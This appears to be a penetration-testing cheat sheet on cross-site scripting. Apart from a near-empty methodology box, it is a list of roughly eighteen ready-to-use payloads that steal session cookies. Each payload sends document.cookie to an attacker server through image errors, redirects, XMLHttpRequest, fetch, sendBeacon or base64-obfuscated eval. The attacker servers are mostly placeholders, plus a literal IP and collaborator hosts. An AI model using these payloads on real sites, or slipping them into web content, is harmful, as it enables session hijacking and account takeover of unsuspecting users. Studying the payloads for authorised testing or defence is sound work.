---
description: Cross-site Scripting
icon: spider-black-widow
---

# XSS

{% hint style="info" %}
## <mark style="color:purple;">Methodology</mark>

* [ ] <mark style="color:purple;">Look if any value you control is being reflected in the</mark> <mark style="color:orange;">**`HTML`**</mark> <mark style="color:purple;">or used by</mark> <mark style="color:orange;">**`Javascript`**</mark> <mark style="color:purple;">code.</mark>
* [ ] <mark style="color:purple;">**Find the context**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">where it's</mark> <mark style="color:orange;">**`reflected/used`**</mark><mark style="color:purple;">.</mark>

***

### <mark style="color:purple;">Reflected XSS</mark>

*


{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Stealing Cookies</mark>

### <mark style="color:purple;">Key Condition -></mark> <mark style="color:orange;">**`HttpOnly`**</mark> <mark style="color:purple;">needs to be set to</mark> <mark style="color:orange;">**`false`**</mark>&#x20;

* <mark style="color:purple;">Use when injecting into an image tag where an</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**error event triggers(**</mark><mark style="color:orange;">**`HTTP response error or broken link`**</mark><mark style="color:purple;">**):**</mark>

```html
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
```

* <mark style="color:purple;">Use when you can inject an image and trigger a redirect via the</mark> <mark style="color:orange;">**`onerror`**</mark> <mark style="color:purple;">event(</mark><mark style="color:orange;">**`load error`**</mark><mark style="color:purple;">):</mark>

```html
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
```

* <mark style="color:purple;">Use in situations where</mark> <mark style="color:purple;"></mark><mark style="color:purple;">you can send cookies via an image request (</mark><mark style="color:orange;">**`URL encoding`**</mark><mark style="color:purple;">):</mark>

```html
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
```

* <mark style="color:purple;">Use when</mark>  <mark style="color:purple;"></mark><mark style="color:purple;">you need to send cookies using an</mark> <mark style="color:orange;">**`audio object`**</mark><mark style="color:purple;">:</mark>

```html
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
```

* <mark style="color:purple;">Use when you</mark> <mark style="color:orange;">**`want to redirect`**</mark> <mark style="color:purple;">the user to a server with the cookies attached:</mark>

```html
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* <mark style="color:purple;">Similar to the previous one; use when you</mark>  <mark style="color:orange;">**`want to redirect`**</mark><mark style="color:purple;">:</mark>

```html
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* <mark style="color:purple;">Use in scenarios where you can  modify the</mark> <mark style="color:orange;">**`document.location`**</mark> <mark style="color:purple;">and send cookies:</mark>

```html
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* <mark style="color:purple;">Inject when you need to send cookies via</mark> <mark style="color:orange;">**`document.location.href`**</mark> <mark style="color:purple;">and trigger a</mark> <mark style="color:orange;">**`redirect`**</mark><mark style="color:purple;">:</mark>

```html
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* <mark style="color:purple;">Use to</mark> <mark style="color:orange;">**`dynamically write an image`**</mark> <mark style="color:purple;">that sends cookies:</mark>

```bash
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
```

* <mark style="color:purple;">Use when  you need to</mark> <mark style="color:orange;">**`assign a location redirect`**</mark> <mark style="color:purple;">with cookies:</mark>

```html
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```

* <mark style="color:purple;">Similar to the previous one, use when you need to access</mark> <mark style="color:orange;">**`window.location`**</mark> <mark style="color:purple;">properties dynamically:</mark>

```html
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```

* <mark style="color:purple;">Use when you need to modify</mark> <mark style="color:orange;">**`window.location.href`**</mark> <mark style="color:purple;">dynamically:</mark>

```html
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```

* <mark style="color:purple;">Use when you can</mark> <mark style="color:orange;">**`dynamically join the URL and cookies to redirect`**</mark><mark style="color:purple;">:</mark>

```html
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
```

* <mark style="color:purple;">Use when</mark> <mark style="color:purple;"></mark><mark style="color:purple;">you can send cookies using an</mark> <mark style="color:orange;">**`image object`**</mark><mark style="color:purple;">:</mark>

```html
<script>var i=new Image(); i.src="http://10.10.14.6/?c="+document.cookie;</script>
```

* <mark style="color:purple;">Use when you need to</mark> <mark style="color:orange;">**`redirect with concatenation of cookies`**</mark> <mark style="color:purple;">into a URL:</mark>

```html
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
```

* <mark style="color:purple;">Use in scenarios where you can send cookies via an</mark> <mark style="color:orange;">**`XMLHttpRequest`**</mark><mark style="color:purple;">:</mark>

```html
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
```

* <mark style="color:purple;">Use when you can inject</mark> <mark style="color:orange;">**`base64-encoded JavaScript`**</mark> <mark style="color:purple;">and execute it to send cookies:</mark>

```html
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
```

* <mark style="color:purple;">Use when you need to send cookies via</mark> <mark style="color:orange;">**`fetch`**</mark> <mark style="color:purple;">with</mark> <mark style="color:orange;">**`no-cors`**</mark> <mark style="color:purple;">mode to</mark> <mark style="color:orange;">**`avoid response handling`**</mark><mark style="color:purple;">:</mark>

```html
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
```

* <mark style="color:purple;">Use when you want to send cookies</mark> <mark style="color:orange;">**`asynchronously`**</mark> <mark style="color:purple;">in the background using the</mark> <mark style="color:orange;">**`sendBeacon`**</mark> <mark style="color:purple;">API, typically for stealthier attacks.</mark>

```html
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% endhint %}

